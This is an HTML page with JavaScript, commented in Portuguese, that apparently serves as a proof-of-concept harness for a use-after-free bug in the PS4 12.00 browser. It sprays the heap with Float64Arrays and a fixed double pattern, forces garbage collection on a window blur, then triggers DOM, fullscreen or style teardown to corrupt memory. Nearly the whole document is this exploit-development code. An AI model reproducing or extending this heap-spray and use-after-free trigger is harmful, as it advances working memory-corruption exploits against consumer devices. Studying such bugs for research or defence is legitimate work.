<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF Isolator</title>

</head>
<body>

<h2>PS4 12.00 - UAF Trigger Isolator</h2>
<p>Selecione o gatilho. O navegador entrara em tela cheia.</p>
<p><strong>Pressione OPTIONS para acionar o onblur e iniciar o gatilho.</strong></p>

<button onclick="runTest(1)">Teste 1: Destruicao do DOM</button>
<button onclick="runTest(2)">Teste 2: Saida do Fullscreen</button>
<button onclick="runTest(3)">Teste 3: Teardown de Estilo</button>

<div id="log"></div>

<script>
const PATTERN = 2.121995791e-314;
let currentMode = 0;

function runTest(mode) {
    currentMode = mode;
    const log = document.getElementById("log");
    
    let modeName = "";
    if(mode === 1) modeName = "Destruicao do DOM";
    if(mode === 2) modeName = "Saida do Fullscreen";
    if(mode === 3) modeName = "Teardown de Estilo";

    log.innerHTML = `Executando <b>${modeName}</b>... <br>Pressione OPTIONS agora.`;

    let controllers = [];

    // Passo 1: Alocação inicial para preparar o terreno
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // Entra em Fullscreen
    document.documentElement.webkitRequestFullscreen?.();

    window.onblur = function() {
        // Remove o listener para evitar que múltiplos OPTIONS interfiram no fluxo
        window.onblur = null;
        log.innerHTML = "Onblur acionado. Forçando GC e Spray...";

        // Passo 2: Força o Garbage Collector liberando a memória alocada
        controllers = null;
        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // Passo 3: Spray com o PATTERN para corromper/reocupar a região liberada
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // Passo 4: O Gatilho Isolado
        setTimeout(() => {
            log.innerHTML = "Engatilhando vulnerabilidade...";
            
            if (currentMode === 1) {
                // Teste 1: Limpa o corpo da página sem destruir a estrutura do Document
                while (document.body.firstChild) {
                    document.body.removeChild(document.body.firstChild);
                }
            } 
            else if (currentMode === 2) {
                // Teste 2: Força a API do WebKit a desconstruir os objetos do modo tela cheia
                if (document.webkitIsFullScreen || document.fullscreenElement) {
                    document.webkitCancelFullScreen?.() || document.webkitExitFullscreen?.();
                }
            } 
            else if (currentMode === 3) {
                // Teste 3: Invalida a árvore de renderização e exige um recálculo imediato
                document.documentElement.style.display = 'none';
                let forceLayout = document.documentElement.offsetHeight; 
            }
            
            // Recarrega a página se o navegador sobreviver ao gatilho
            setTimeout(() => location.reload(), 1000);
        }, 3000);
    };
}
</script>

</body>
</html>
